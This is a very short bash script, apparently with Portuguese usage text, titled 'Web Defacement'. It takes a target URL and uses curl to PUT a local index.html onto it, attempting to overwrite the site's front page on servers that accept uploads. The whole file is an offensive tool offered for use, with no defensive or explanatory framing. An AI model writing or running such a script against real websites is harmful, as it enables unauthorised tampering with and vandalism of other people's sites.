#!/bin/bash
echo "Web Defacement"
echo "Uso.: sh deface.sh http://url"
echo 
curl -T index.html $1
